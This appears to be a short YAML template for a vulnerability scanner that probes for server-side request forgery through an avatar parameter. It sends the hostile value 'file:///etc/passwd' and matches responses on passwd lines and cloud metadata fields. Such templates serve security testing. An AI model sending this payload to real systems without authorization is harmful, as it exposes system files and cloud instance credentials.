id: ssrf-019
name: 'SSRF via avatar'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via avatar (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      avatar:
        - 'file:///etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
